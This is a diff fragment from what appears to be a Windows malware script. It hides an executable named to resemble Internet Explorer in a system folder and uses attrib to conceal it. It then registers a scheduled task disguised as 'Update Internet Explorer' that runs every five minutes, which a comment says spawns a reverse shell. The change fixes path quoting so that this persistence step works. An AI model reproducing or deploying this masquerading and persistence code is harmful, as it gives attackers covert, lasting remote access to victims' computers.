@@ -16,7 +16,7 @@ move $iexplorerrLoc = "C:\Program Files\Common Files\System"
 # Hide the file from windows explorer using attrib
 attrib +h "C:\Program Files\Common Files\System\iexplorerr.exe"
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "Update Internet Explorer" /tr C:\Program Files\Common Files\System\iexplorerr.exe
+schtasks /create /sc minute /mo 5 /tn "Update Internet Explorer" /tr "C:\Program Files\Common Files\System\iexplorerr.exe"
 
 # Find PowerHell.bat
 $powerhellLoc = Get-ChildItem PowerHell.bat
